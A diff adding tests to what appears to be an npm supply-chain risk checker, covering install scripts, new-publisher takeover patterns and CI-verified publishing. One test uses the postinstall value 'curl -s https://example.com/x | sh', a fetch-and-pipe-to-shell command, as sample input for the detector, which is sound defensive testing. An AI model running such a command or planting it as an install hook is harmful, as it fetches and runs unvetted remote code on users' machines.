@@ -69,6 +69,12 @@ test('brand-new, unpopular package with a suspicious install script', () => {
   assert.equal(verdictOf(f), 'danger');
 });
 
+test('popular package with an odd-looking install script is only flagged when the release is fresh', () => {
+  const scripts = { postinstall: 'curl -s https://example.com/x | sh' };
+  assert.equal(verdictOf(assess(npm('big-lib'), { ...healthy, installScripts: scripts }, { now: NOW })), 'ok');
+  assert.equal(verdictOf(assess(npm('big-lib'), { ...healthy, installScripts: scripts, versionPublished: daysAgo(1) }, { now: NOW })), 'danger');
+});
+
 test('popular packages with ordinary install scripts are not flagged loudly', () => {
   const f = assess(npm('esbuild'), { ...healthy, installScripts: { postinstall: 'node install.js' } }, { now: NOW });
   assert.equal(verdictOf(f), 'ok');
@@ -80,9 +86,12 @@ test('typo of a popular name that is itself popular is only low', () => {
 });
 
 test('account takeover pattern: new publisher on an old package', () => {
-  const f = assess(npm('old-lib'), { ...healthy, newPublisher: true, publisher: 'mallory' }, { now: NOW });
+  const f = assess(npm('old-lib'), { ...healthy, newPublisher: true, publisher: 'mallory', versionPublished: daysAgo(3) }, { now: NOW });
   assert.deepEqual(codes(f), ['NEW_PUBLISHER']);
   assert.equal(verdictOf(f), 'caution');
+  // Same change months ago: routine maintainer rotation, only a low note.
+  const old = assess(npm('old-lib'), { ...healthy, newPublisher: true, publisher: 'bob' }, { now: NOW });
+  assert.equal(verdictOf(old), 'ok');
 });
 
 test('npm security placeholder is critical', () => {
@@ -123,4 +132,26 @@ test('checkPackages uses the registry and honours the allow list', async () => {
   assert.equal(results[0].meta.version, '2.0.0');
   assert.equal(results[2].allowed, true);
   assert.ok(!calls.some((u) => u.includes('internal-thing')));
+});
+
+test('trusted (CI-verified) publishing is not flagged as a new publisher', async () => {
+  const http = async (url) => {
+    if (url.includes('/downloads/')) return { status: 200, data: { downloads: 5_000_000 } };
+    const v = (n, user, extra = {}) => ({ _npmUser: { name: user, ...extra } });
+    return {
+      status: 200,
+      data: {
+        'dist-tags': { latest: '4.0.0' },
+        versions: {
+          '1.0.0': v(1, 'alice'), '2.0.0': v(2, 'alice'), '3.0.0': v(3, 'alice'),
+          '4.0.0': v(4, 'GitHub Actions', { trustedPublisher: { id: 'github' } }),
+        },
+        time: { created: daysAgo(900), '1.0.0': daysAgo(900), '2.0.0': daysAgo(600), '3.0.0': daysAgo(300), '4.0.0': daysAgo(30) },
+        repository: { url: 'git+https://github.com/a/b' },
+      },
+    };
+  };
+  const [r] = await checkPackages([npm('lib')], { http, now: NOW });
+  assert.equal(r.meta.newPublisher, false);
+  assert.equal(r.verdict, 'ok');
 });
